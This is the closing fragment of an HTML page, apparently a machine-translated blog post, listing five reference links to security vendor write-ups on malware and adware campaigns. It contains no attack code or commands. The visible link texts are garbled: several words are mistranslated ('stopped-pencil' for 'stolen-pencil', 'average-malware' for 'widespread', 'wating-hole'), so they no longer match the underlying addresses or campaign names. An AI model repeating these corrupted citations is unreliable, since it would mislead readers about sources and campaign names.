href="https://www.netscout.com/blog/asert/stolen-pencil-campaign-targets-academia" rel="noopener ugc nofollow" target="_blank">https://www . netscout . com/blog/asert/stopped-pencil-campaign-targets-academia</a></p><p id="c748" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">2:<a class="ae lf" href="https://www.welivesecurity.com/2017/06/06/turlas-watering-hole-campaign-updated-firefox-extension-abusing-instagram/" rel="noopener ugc nofollow" target="_blank">https://www . welivesecurity . com/2017/06/06/tur las-wating-hole-campaign-updated-Firefox-extension-abiling-insta gram/</a></p><p id="c1af" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">3:<a class="ae lf" href="https://www.flashpoint-intel.com/blog/newly-discovered-malware-framework-cashing-in-on-ad-fraud/" rel="noopener ugc nofollow" target="_blank">https://www . flash point-Intel . com/blog/new-discovered-malware-framework-cash-in-on-ad-fraud/</a></p><p id="5706" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">4:<a class="ae lf" href="https://www.microsoft.com/security/blog/2020/12/10/widespread-malware-campaign-seeks-to-silently-inject-ads-into-search-results-affects-multiple-browsers/" rel="noopener ugc nofollow" target="_blank">https://www . Microsoft . com/security/blog/2020/12/10/average-malware-campaign-seeks-to-silent-inject-ads-into-search-results-affects-multiple-browsers/</a></p><p id="4dfd" class="pw-post-body-paragraph ip iq hh ir b is it iu iv iw ix iy iz ja jb jc jd je jf jg jh ji jj jk jl jm ha bi translated">5:<a class="ae lf" href="https://blog.malwarebytes.com/threat-analysis/2018/04/pbot-python-based-adware/" rel="noopener ugc nofollow" target="_blank">https://blog . malware bytes . com/threat-analysis/2018/04/pbot-python-based-adware/</a></p></div></div>    
</body>
</html>